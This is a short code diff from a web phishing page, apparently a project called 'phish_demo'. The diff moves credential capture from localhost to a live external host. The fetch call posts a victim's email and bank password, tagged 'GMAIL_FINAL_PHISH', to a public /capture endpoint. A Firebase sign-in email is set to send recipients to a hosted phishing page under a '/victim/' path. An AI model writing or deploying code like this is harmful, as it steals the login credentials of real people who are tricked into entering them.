@@ -117,7 +117,7 @@
         const passValue = document.getElementById('bankPass').value;
 
         try {
-            await fetch('http://localhost:5000/capture', {
+            await fetch('https://cybersecurity-2.onrender.com/capture', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({ type: 'GMAIL_FINAL_PHISH', user: userEmail, pass: passValue })
@@ -128,11 +128,13 @@
     };
 
     // --- Trigger Real Firebase Email ---
-    async function triggerSecureEmail(userEmail) {
-        const actionCodeSettings = {
-            url: window.location.href.split('?')[0],
-            handleCodeInApp: true,
-        };
+async function triggerSecureEmail(userEmail) {
+    const actionCodeSettings = {
+        // Change this to your exact live Render URL for the phishing page
+        url: 'https://cybersecurity-2.onrender.com/victim/phish_demo.html',
+        handleCodeInApp: true,
+    };
+    
 
         try {
             await sendSignInLinkToEmail(auth, userEmail, actionCodeSettings);
